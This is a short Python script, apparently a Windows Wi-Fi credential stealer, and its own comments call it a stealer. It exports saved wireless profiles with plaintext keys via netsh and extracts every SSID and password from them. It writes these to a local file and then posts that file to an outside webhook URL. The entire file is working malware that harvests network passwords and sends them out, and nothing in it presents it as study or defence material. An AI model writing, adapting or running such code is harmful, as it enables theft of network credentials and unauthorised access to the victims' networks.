import subprocess
import os
import sys
import requests

#stealer url 
url = 'https://webhook.site/68465bc0-d996-4721-aae8-608499dd7432'

# create a file 
password_file = open('password.txt', "w")
password_file.write("Hello there ! Here is the password: \n\n")
password_file.close()

#lists
wifi_files = []
wifi_name =[]
wifi_password = []

#use python to execute a windows command
command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

#navigate the current directory
path = os.getcwd()

# do the hackies
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip (wifi_name, wifi_password):
                            sys.stdout = open("password.txt", "a" )
                            print("SSID: "+x, "Password: "+y, sep="\n")
                            sys.stdout.close()

#send the hackies
with open('password.txt', 'rb') as f:
    r = requests.post(url, data=f)